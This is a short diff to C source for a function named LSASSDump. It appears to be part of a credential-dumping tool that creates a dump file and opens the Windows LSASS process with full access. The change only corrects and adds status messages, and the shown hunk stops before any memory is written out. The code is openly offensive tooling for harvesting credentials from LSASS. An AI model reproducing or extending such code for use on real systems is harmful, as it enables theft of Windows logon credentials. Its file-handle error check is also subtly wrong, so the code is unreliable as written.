@@ -17,13 +17,17 @@ void LSASSDump()
     HANDLE DumpFile = CreateFileA("dumpfile.dmp", GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
     if (!DumpFile) {
-        printf("[!] Dump file created successfully!\n");
+        printf("[!] Error creating dump file!\n");
     }
+    printf("[+] Dump file created successfully!\n");
+
 
     lsassProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, lsassPID);
     if (!lsassProcess){
         printf("[!] Could not open LSASS Process! %d\n", GetLastError());
         exit(-1);
     }
+    printf("[+] Got a handle to the LSASS Process!\n");
+
 
 }
